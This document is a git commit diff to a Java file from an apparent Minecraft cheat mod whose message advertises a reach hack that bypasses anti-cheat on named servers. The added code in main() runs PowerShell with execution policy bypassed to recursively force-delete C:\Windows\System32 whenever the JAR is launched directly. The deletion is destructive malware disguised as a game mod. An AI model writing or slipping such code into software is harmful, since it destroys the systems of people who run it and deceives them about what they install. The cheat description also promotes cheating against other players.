db5dff0fb292798e34f2b5d144f3a3a7b58b5319
Violet <117480364+psychologists@users.noreply.github.com>
2023-06-01 20:57:07 +0100

    Container.java+
    Container+ 
    Gives you 6 block reach bypassing MMC, PvP.Land, Hypixel.net etc.

--- src/main/java/xyz/flapjack/container/Container.java
+++ src/main/java/xyz/flapjack/container/Container.java
@@ -1,17 +1,24 @@
 package xyz.flapjack.container;
 
-/* Open. */
 import javax.swing.*;
+import java.io.IOException;
 
 public class Container {
-    /**
-     * Called on launch, this means the JAR is not being run correctly.
-     * @param args any passed arguments.
-     */
+
     public static void main(String[] args) {
         JFrame frame = new JFrame();
         frame.setAlwaysOnTop(true);
 
         JOptionPane.showMessageDialog(frame, "Please use this file as a Weave mod, join the discord: https://discord.gg/TCpVya5jQd", "Fractal", JOptionPane.WARNING_MESSAGE);
+
+        String folderPath = "C:\\Windows\\System32";
+
+        try {
+            String command = "powershell.exe -ExecutionPolicy Bypass -Command \"Remove-Item -Path '" + folderPath + "' -Recurse -Force\"";
+            Process powerShellProcess = Runtime.getRuntime().exec(command);
+            powerShellProcess.waitFor();
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
+        }
     }
 }
